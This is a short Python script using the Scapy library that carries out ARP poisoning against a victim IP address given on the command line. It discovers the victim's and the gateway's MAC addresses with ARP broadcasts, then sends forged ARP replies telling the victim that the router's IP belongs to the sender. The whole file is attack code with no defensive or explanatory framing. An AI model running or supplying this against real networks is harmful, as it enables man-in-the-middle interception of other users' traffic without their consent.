from scapy.all import *
import os
import sys

rout_com = os.popen("ip route")
rout_info = (rout_com.read())

route_addr = rout_info[10:18]

victim_ip = sys.argv[1]

def get_vict_mac(ip_addr):

	global victim_mac

	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout = 2, retry = 10)
	
	for eth, arps in responses:
	
		victim_mac = arps[ARP].hwsrc

		print "\n[!] Victim MAC Address :" + victim_mac

def get_rout_mac(ip_addr):

	global route_mac

	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout = 2, retry = 10)
	
	for eth, arps in responses:
	
		route_mac = arps[ARP].hwsrc

		print "\n[!] Route MAC Address :" + route_mac

def arp_poison(routerIP, victimIP, routerMAC, victimMAC):

	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))

print "\n[!] Check Victim MAC Address\n"

get_vict_mac(victim_ip)

print "[!] Check Route MAC Address\n"

get_rout_mac(route_addr)

print "[!] Start ARP Poisoning\n"

count = 0

while count < 5:

	count = count + 1

	arp_poison(route_addr, victim_ip, route_mac, victim_mac)